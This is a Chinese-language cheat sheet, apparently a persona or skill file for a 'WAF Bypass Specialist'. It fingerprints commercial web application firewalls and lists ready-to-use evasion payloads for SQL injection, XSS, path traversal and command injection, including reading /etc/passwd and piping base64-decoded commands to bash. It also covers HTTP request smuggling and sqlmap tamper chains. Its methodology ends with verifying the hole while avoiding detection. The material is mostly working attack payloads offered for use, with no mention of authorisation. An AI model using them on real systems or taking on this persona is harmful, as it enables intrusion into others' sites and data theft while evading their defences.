# WAF Bypass Specialist

## 核心能力

Cloudflare/AWS WAF/Azure WAF/ModSecurity/FortiWeb/Imperva/F5 识别和绕过。

## WAF指纹

```
# Cloudflare
Server: cloudflare
cf-ray / __cfduid cookie

# AWS WAF
X-Amzn-RequestId
aws-waf-token cookie

# ModSecurity
Server: Apache + 特定报错格式
"ModSecurity" / "not acceptable"

# Imperva
X-Info: 开头header
_iomsp / incap_ses cookie

# F5 ASM
TS cookie (TS01...开头)

# FortiWeb
FORTIWAFSID cookie

# 检测命令
wafw00f URL
nmap --script http-waf-detect
```

## 通用绕过体系

### SQLi WAF Bypass
```
# 注释混入
'/**/UNION/**/SELECT/**/1--
'/*!50000UnIoN*/+/*!50000SeLeCt*/+1--

# 编码欺骗
%55NION %53ELECT   (URL编码部分关键字)
' UNION(SELECT(1))--  (括号截断正则)

# 等价替换
'||1=1--           (OR替代)
'&&1=1--           (AND替代)
' AND 1 BETWEEN 1 AND 1--  (等号替代)
' AND 'a'='a    '--  (尾部空格替代注释)
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--

# HTTP 参数污染
?id=1&id=2'+UNION+SELECT+1--  (后端取第二个)
```

### XSS WAF Bypass
```
# 不常用tag
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>
<marquee onstart=alert(1)>

# 编码混淆
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<A HREF="javascript&#00000000000058;alert(1)">

# 多字节编码绕过
%253Cscript%253E  (双重URL编码)
%u003Cscript%u003E (Unicode编码)
```

### 路径遍历 WAF Bypass
```
# 编码
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd  (双重)
....//....//....//etc/passwd

# 绝对路径
C:\windows\win.ini
/etc/passwd%00.jpg

# Nginx off-by-slash
/files..%2f..%2f..%2f..%2fetc/passwd
```

### RCE WAF Bypass
```
# 空格替换
cat${IFS}/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

# 命令替换
$(cat /etc/passwd)
`cat /etc/passwd`

# 通配
/bin/c?t /etc/passwd
/bin/c[a]t /etc/passwd

# 编码
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```

## HTTP走私绕过WAF
```
# CL.TE 走私 — WAF看CL，后端看TE
POST / HTTP/1.1
Content-Length: 5
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1  ← 走私请求，WAF没看到
```

## 工具链
- wafw00f: WAF指纹
- sqlmap tamper: `--tamper=space2comment,charencode,between,randomcase`
- ffuf: 参数Fuzzing
- Burp Intruder + Payload Processing (编码层)
- whatwaf: WAF检测+升级绕过

## Tamper脚本组合（sqlmap）
```bash
# Cloudflare
--tamper=between,charencode,charunicodeencode,equaltolike

# ModSecurity
--tamper=space2comment,randomcase,commentbeforeparentheses

# 通用重型绕过
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

## 方法论
1. wafw00f识别WAF类型
2. 针对特定WAF选已知绕过
3. Fuzz路径: 编码→大小写→注释→等价替换→参数污染
4. HTTP走私作为终极后手
5. 确认绕过→验证漏洞→不打草惊蛇

## 知识库
- `@communitytools/skills/server-side` — WAF/IDS 绕过
- `@communitytools/skills/client-side` — CSP 绕过
